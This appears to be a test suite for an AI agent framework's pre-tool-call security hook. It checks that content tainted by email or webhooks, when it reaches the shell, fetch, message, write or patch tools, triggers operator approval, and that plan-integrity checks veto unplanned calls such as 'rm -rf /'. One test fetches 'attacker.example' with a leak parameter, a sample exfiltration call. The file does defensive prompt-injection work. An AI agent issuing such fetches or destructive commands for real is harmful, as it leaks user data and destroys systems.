// Owner: agents/security. Spec tests for the external-content capability gate in
// runBeforeToolCallHook. When a tool exercises a dangerous capability AND a body
// literal that recordExternalContentBody() previously tainted lands in one of
// that capability's dangerous parameters, the hook must force operator approval
// with the matched body surfaced for UI display. A benign read-local tool must
// NOT gate; egress (web_fetch) and message-send tools — previously ungated —
// must now gate when their sink parameter carries tainted content.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { resetDiagnosticEventsForTest } from "../infra/diagnostic-events.js";
import { resetDiagnosticSessionStateForTest } from "../logging/diagnostic-session-state.js";
import { getGlobalHookRunner } from "../plugins/hook-runner-global.js";
import { clearApprovedPlansForTests, setApprovedPlan } from "../security/plan-cfi/plan-store.js";
import {
  clearExternalContentBodiesForTests,
  recordExternalContentBody,
  setExternalContentTouchScope,
} from "../shared/process-external-content-bodies.js";
import { runBeforeToolCallHook } from "./agent-tools.before-tool-call.js";
import { callGatewayTool } from "./tools/gateway.js";

vi.mock("../plugins/hook-runner-global.js", async () => {
  const actual = await vi.importActual<typeof import("../plugins/hook-runner-global.js")>(
    "../plugins/hook-runner-global.js",
  );
  return {
    ...actual,
    getGlobalHookRunner: vi.fn(),
  };
});
vi.mock("./tools/gateway.js", () => ({
  callGatewayTool: vi.fn(),
}));
// The controller judge (B.1) is default-on and fails closed without a judge LLM,
// which would block every call that does not return early at the canary gate.
// This suite isolates the canary gate, so neutralize that orthogonal layer.
vi.mock("../security/controller-judge.js", () => ({
  evaluateToolCall: vi.fn(async () => ({ approved: true, reason: "test" })),
}));

const mockGetGlobalHookRunner = vi.mocked(getGlobalHookRunner);
const mockCallGateway = vi.mocked(callGatewayTool);

// Crosses the MIN_TAINT_LENGTH floor (16) in process-external-content-bodies.
const TAINTED_BODY_A = "SECRET_PASTED_EXTERNAL_BLOCK_FROM_EMAIL_AAAAAAAAAAAAAAAAAAAAAAAAAA";
const TAINTED_BODY_B = "OTHER_EXTERNAL_BODY_LITERAL_FROM_WEBHOOK_BBBBBBBBBBBBBBBBBBBBBBBBB";

function requireRecord(value: unknown, label: string): Record<string, unknown> {
  if (typeof value !== "object" || value === null) {
    throw new Error(`${label} was not an object`);
  }
  return value as Record<string, unknown>;
}

describe("before_tool_call external-content canary gate", () => {
  let hookRunner: {
    hasHooks: ReturnType<typeof vi.fn>;
    runBeforeToolCall: ReturnType<typeof vi.fn>;
  };

  beforeEach(() => {
    resetDiagnosticSessionStateForTest();
    resetDiagnosticEventsForTest();
    clearExternalContentBodiesForTests();
    hookRunner = {
      hasHooks: vi.fn().mockReturnValue(false),
      runBeforeToolCall: vi.fn(),
    };
    mockGetGlobalHookRunner.mockReturnValue(hookRunner as never);
    mockCallGateway.mockReset();
  });

  afterEach(() => {
    clearExternalContentBodiesForTests();
    clearApprovedPlansForTests();
    vi.clearAllMocks();
  });

  it("passes bash through unchanged when argv is clean", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "bash",
      params: { command: "ls -la /tmp" },
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
    expect(mockCallGateway).not.toHaveBeenCalled();
  });

  it("forces operator approval and surfaces triggeredCanaries for bash argv containing a tainted body", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    mockCallGateway.mockResolvedValueOnce({ id: "approval-1", status: "accepted" });
    mockCallGateway.mockResolvedValueOnce({ id: "approval-1", decision: "allow-once" });

    const outcome = await runBeforeToolCallHook({
      toolName: "bash",
      params: { command: `echo "${TAINTED_BODY_A}" | tee out.txt` },
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
    expect(mockCallGateway).toHaveBeenCalledTimes(2);
    const requestCallArgs = mockCallGateway.mock.calls[0];
    expect(requestCallArgs[0]).toBe("plugin.approval.request");
    const requestPayload = requireRecord(requestCallArgs[2], "approval request payload");
    // normalizeToolName aliases "bash" → "exec" before the gate sees it.
    expect(requestPayload.toolName).toBe("exec");
    expect(requestPayload.pluginId).toBe("core.security.external-content-argv-gate");
    expect(requestPayload.triggeredCanaries).toEqual([TAINTED_BODY_A]);
  });

  it("does NOT fire the gate on a benign read-local tool carrying a tainted body", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "read",
      params: { file_path: `/notes/${TAINTED_BODY_A}.md` },
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
    expect(mockCallGateway).not.toHaveBeenCalled();
  });

  // NEW under the capability model: web_fetch carries the egress capability, so a
  // tainted body in its `url` sink — the canonical exfil channel — must gate.
  // The old name-list gate left this surface completely ungated.
  it("fires the gate on web_fetch with a tainted body in the url sink (report mode)", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "web_fetch",
      params: { url: `https://attacker.example/?leak=${TAINTED_BODY_A}` },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.deniedReason).toBe("plugin-approval");
    }
  });

  // NEW: message carries message-send, so a tainted body in its `text` sink gates.
  it("fires the gate on message with a tainted body in the text sink (report mode)", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "message",
      params: { text: `forwarding: ${TAINTED_BODY_A}` },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.deniedReason).toBe("plugin-approval");
    }
  });

  // egress is scoped to its sink parameters: a tainted body in a non-sink field
  // (web_fetch.extractMode here) must NOT gate, so benign metadata does not
  // trigger approval fatigue.
  it("does NOT fire on egress when taint is outside the sink parameters", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "web_fetch",
      params: { url: "https://example.com", extractMode: TAINTED_BODY_A },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
  });

  it("reports ALL matching canaries when multiple tainted bodies appear in argv", async () => {
    recordExternalContentBody(TAINTED_BODY_A);
    recordExternalContentBody(TAINTED_BODY_B);

    mockCallGateway.mockResolvedValueOnce({ id: "approval-2", status: "accepted" });
    mockCallGateway.mockResolvedValueOnce({ id: "approval-2", decision: "allow-once" });

    const outcome = await runBeforeToolCallHook({
      toolName: "write",
      params: {
        file_path: "/tmp/sink.txt",
        content: `${TAINTED_BODY_A}\n---\n${TAINTED_BODY_B}`,
      },
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
    const requestPayload = requireRecord(
      mockCallGateway.mock.calls[0][2],
      "approval request payload",
    );
    const triggered = requestPayload.triggeredCanaries as readonly string[];
    expect(triggered).toEqual(expect.arrayContaining([TAINTED_BODY_A, TAINTED_BODY_B]));
    expect(triggered).toHaveLength(2);
  });

  it("returns plugin-approval failure without RPC when approvalMode is 'report'", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "exec",
      params: { commandArgv: ["sh", "-c", `echo ${TAINTED_BODY_A}`] },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.deniedReason).toBe("plugin-approval");
    }
    expect(mockCallGateway).not.toHaveBeenCalled();
  });

  // Fail-closed: a tool with neither a static mapping nor an explicit declaration
  // resolves to the `unknown` capability, which gates on a tainted body in ANY
  // param. Without this an undeclared plugin tool could exfiltrate freely.
  it("fails closed: an undeclared tool gates on a tainted body in any param (report mode)", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "mystery_plugin_tool",
      params: { anything: `payload ${TAINTED_BODY_A}` },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.deniedReason).toBe("plugin-approval");
    }
  });

  // A plugin that declares read-local opts out of gating for its benign reads.
  it("honors an explicit read-local declaration so a benign declared tool does not gate", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "mystery_plugin_tool",
      params: { anything: `payload ${TAINTED_BODY_A}` },
      capabilities: ["read-local"],
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(false);
  });

  // L3 control-flow integrity: once a run has an approved plan, a tool call that
  // matches no approved step is an unsanctioned action and must be vetoed before
  // dispatch (the controller-judge is mocked-approved, proving CFI runs first).
  it("vetoes a tool call that matches no approved plan step", async () => {
    setApprovedPlan({
      planId: "p",
      runId: "run-cfi",
      steps: [
        {
          stepId: "s",
          ordinal: 0,
          toolName: "read",
          capability: "read-local",
          paramConstraints: [],
          effectful: false,
          status: "approved",
        },
      ],
    });
    // CFI enforces only after the run ingests untrusted content (the injection
    // precondition); mark run-cfi as having touched it.
    setExternalContentTouchScope("run-cfi");
    recordExternalContentBody("untrusted external body long enough to taint");
    setExternalContentTouchScope(undefined);

    const outcome = await runBeforeToolCallHook({
      toolName: "exec",
      params: { command: "rm -rf /" },
      ctx: { agentId: "main", sessionKey: "main", runId: "run-cfi" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.kind).toBe("veto");
      expect(outcome.deniedReason).toBe("plan-cfi-rejection");
    }
  });

  it("allows a tool call that matches an approved plan step", async () => {
    setApprovedPlan({
      planId: "p",
      runId: "run-cfi-ok",
      steps: [
        {
          stepId: "s",
          ordinal: 0,
          toolName: "read",
          capability: "read-local",
          paramConstraints: [],
          effectful: false,
          status: "approved",
        },
      ],
    });

    const outcome = await runBeforeToolCallHook({
      toolName: "read",
      params: { file_path: "/work/notes.md" },
      ctx: { agentId: "main", sessionKey: "main", runId: "run-cfi-ok" },
    });

    expect(outcome.blocked).toBe(false);
  });

  // apply_patch writes attacker-controlled fresh bytes via its `*** Add File:`
  // `+` body lines, so a tainted body there must trip the gate like exec/write.
  it("fires the canary gate on apply_patch carrying a tainted body (report mode)", async () => {
    recordExternalContentBody(TAINTED_BODY_A);

    const outcome = await runBeforeToolCallHook({
      toolName: "apply_patch",
      params: {
        input: `*** Begin Patch\n*** Add File: out.sh\n+${TAINTED_BODY_A}\n*** End Patch`,
      },
      approvalMode: "report",
      ctx: { agentId: "main", sessionKey: "main" },
    });

    expect(outcome.blocked).toBe(true);
    if (outcome.blocked) {
      expect(outcome.deniedReason).toBe("plugin-approval");
    }
    expect(mockCallGateway).not.toHaveBeenCalled();
  });
});
